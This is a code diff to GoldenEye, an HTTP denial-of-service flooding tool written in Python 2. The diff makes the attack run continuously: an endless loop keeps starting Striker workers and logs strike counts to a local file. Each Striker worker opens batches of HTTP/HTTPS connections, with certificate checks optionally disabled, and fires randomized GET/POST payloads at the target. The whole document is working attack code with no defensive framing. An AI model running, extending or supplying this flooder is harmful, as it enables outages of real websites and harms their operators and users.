@@ -143,7 +143,9 @@ class GoldenEye(object):
 
         # Initialize Counters
         self.counter = self.manager.list((0, 0, 0))
-
+        self.filePath = "./log"
+        f = open(self.filePath, "w")
+        f.close()
 
     def exit(self):
         self.stats()
@@ -169,24 +171,29 @@ class GoldenEye(object):
             print "Starting {0} concurrent workers".format(self.nr_workers)
         sys.stdout.flush()
         # Start workers
-        for i in range(int(self.nr_workers)):
+        while True:
+            for i in range(int(self.nr_workers)):
+                try:
+                    worker = Striker(self.url, self.nr_sockets, self.counter)
+                    worker.useragents = self.useragents
+                    worker.method = self.method
 
-            try:
-
-                worker = Striker(self.url, self.nr_sockets, self.counter)
-                worker.useragents = self.useragents
-                worker.method = self.method
-
-                self.workersQueue.append(worker)
-                worker.start()
-            except (Exception):
-                error("Failed to start worker {0}".format(i))
-                pass 
-
+                    self.workersQueue.append(worker)
+                    worker.start()
+                    time.sleep(1.0/int(self.nr_workers))
+                except (Exception):
+                    error("Failed to start worker {0}".format(i))
+                    pass 
+            
+            f = open("./log", "a+")
+            f.write("{0} {1} {2}\n".format(self.counter[0], self.counter[1], self.counter[2]))
+            f.close()
+            if self.counter[0] > 0 or self.counter[1] > 0:
+                print "{0} GoldenEye strikes deferred. ({1} Failed). {2} Success".format(self.counter[0], self.counter[1], self.counter[2])
         if DEBUG:
             print "Initiating monitor"
-        sys.stdout.flush()
-        self.monitor()
+        #sys.stdout.flush()
+        #self.monitor()
 
     def stats(self):
 
@@ -317,45 +324,45 @@ class Striker(Process):
         if DEBUG:
             print "Starting worker {0}".format(self.name)
 
-        while self.runnable:
+        
 
-            try:
+        try:
 
-                for i in range(self.nr_socks):
-                
-                    if self.ssl:                    
-                        if SSLVERIFY:
-                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
-                        else:
-                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port, context=ssl._create_unverified_context())                                                  
+            for i in range(self.nr_socks):
+            
+                if self.ssl:                    
+                    if SSLVERIFY:
+                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
                     else:
-                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)
-
-                    self.socks.append(c)
-
-                for conn_req in self.socks:
-
-                    (url, headers) = self.createPayload()
-
-                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
-
-                    conn_req.request(method.upper(), url, None, headers)
-
-                for conn_resp in self.socks:
-
-                    resp = conn_resp.getresponse()
-                    if resp.status == 200:
-                        self.incSucc()
-                    self.incCounter()
-
-                self.closeConnections()
-                
-            except:
-                self.incFailed()
-                if DEBUG:
-                    raise
+                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port, context=ssl._create_unverified_context())                                                  
                 else:
-                    pass # silently ignore
+                    c = HTTPCLIENT.HTTPConnection(self.host, self.port)
+
+                self.socks.append(c)
+
+            for conn_req in self.socks:
+
+                (url, headers) = self.createPayload()
+
+                method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
+
+                conn_req.request(method.upper(), url, None, headers)
+
+            for conn_resp in self.socks:
+
+                resp = conn_resp.getresponse()
+                if resp.status == 200:
+                    self.incSucc()
+                self.incCounter()
+
+            self.closeConnections()
+            
+        except:
+            self.incFailed()
+            if DEBUG:
+                raise
+            else:
+                pass # silently ignore
 
         if DEBUG:
             print "Worker {0} completed run. Sleeping...".format(self.name)
